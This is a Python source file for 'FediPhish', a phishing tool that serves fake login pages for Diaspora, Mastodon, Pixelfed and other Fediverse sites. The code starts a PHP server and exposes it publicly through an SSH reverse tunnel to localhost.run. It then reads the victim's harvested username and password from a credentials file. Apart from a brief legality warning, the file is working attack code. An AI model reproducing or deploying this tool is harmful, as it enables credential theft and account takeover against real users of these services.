from subprocess import Popen as bg_cmd,DEVNULL,getoutput as bg_cmd_output
import time,os
from core.doge import *

def banner():
    print('''
\033[40m\033[31m\033[01m* _____        _ _ ____  _     _     _     *
 |  ___|__  __| (_)  _ \| |__ (_)___| |__   
 | |_ / _ \/ _` | | |_) | '_ \| / __| '_ \  
 |  _|  __/ (_| | |  __/| | | | \__ \ | | | 
 |_|  \___|\__,_|_|_|   |_| |_|_|___/_| |_| 
*                                          *
  Phish the Fediverse :)                    
         v1.1    @1337vrt   doge xD         \033[0m''')

def intro():
    banner()
    print('''
\033[41m\033[01m\033[93mUsage of FediPhish for attacking targets
without prior mutual consent is illegal.\033[0m''')

def startup():
    bg_cmd('rm -r server && mkdir server',shell=True,stderr=DEVNULL,stdout=DEVNULL)
    bg_cmd('rm link',shell=True,stderr=DEVNULL,stdout=DEVNULL)
    check_php = bg_cmd_output('which php')
    if check_php == '':
         col_exit("I require php but it's not installed.")
         exit()

def stop_services():
    bg_cmd('killall -9 ssh && killall -2 php',shell=True,stderr=DEVNULL,stdout=DEVNULL)

def move_files(web):
    bg_cmd('cp -r ./core/web/'+web+'/* ./server',shell=True,stderr=DEVNULL,stdout=DEVNULL)
    bg_cmd('cp ./core/web/login.php ./server',shell=True,stderr=DEVNULL,stdout=DEVNULL)

def web_list():
    print('\n\033[01m\033[35mAvailable phishing modules\033[0m\033[01m')
    print('+'+'-'*30+'+')
    print('[1] Diaspora\t[4] Mastodon\n[2] GNU-Social\t[5] Pixelfed\n[3] Hubzilla\t[6] Socialhome')
    print('+'+'-'*30+'+')
    print('[99] Exit')
    while 1:
        ch=input('\n\033[35mFediPhish>\033[0m ')
        if ch in ['1','2','3','4','5','6','99']:
            break
        else:
            print('\033[31m\033[01mInvalid')
    if ch=='1':
        selected='Diaspora'
    elif ch=='2':
        selected='GNU-Social'
    elif ch=='3':
        selected='Hubzilla'
    elif ch=='4':
        selected='Mastodon'
    elif ch=='5':
        selected='Pixelfed'
    elif ch=='6':
        selected='Socialhome'
    elif ch=='99':
        exit()
    return selected

def start_server(port,selected):
    move_files(selected)
    os.system('clear')
    banner()
    col_selected(selected)
    col_info('Starting php server [localhost:'+port+']...','')
    bg_cmd('php -S localhost:'+port+' -t ./server',shell=True,stderr=DEVNULL,stdout=DEVNULL)
    print('\33[92m'+' done'+'\33[0m')
    col_info('Exposing localhost:'+port+' to the Internet...','')
    print(end='',flush=True)
    bg_cmd('sh -c "ssh -o StrictHostKeyChecking=no -R 80:localhost:'+port+' nokey@localhost.run 2>/dev/null 1> link" &',shell=True,stderr=DEVNULL,stdout=DEVNULL)
    time.sleep(8)
    print('\33[92m'+' done'+'\33[0m')
    link = bg_cmd_output('grep -o "https://[0-9a-z]*\.localhost.run" link')
    link_text=f'Link: {link}'
    col_info(link_text)
    col_info('Waiting for target to login')
    
def get_creds():
    col_info('Credentials found')
    user = bg_cmd_output('cat ./server/creds.txt | head -1')
    passwd = bg_cmd_output('cat ./server/creds.txt | tail -1')
    print(f'[Username] : {user}\n[Password] : {passwd}')
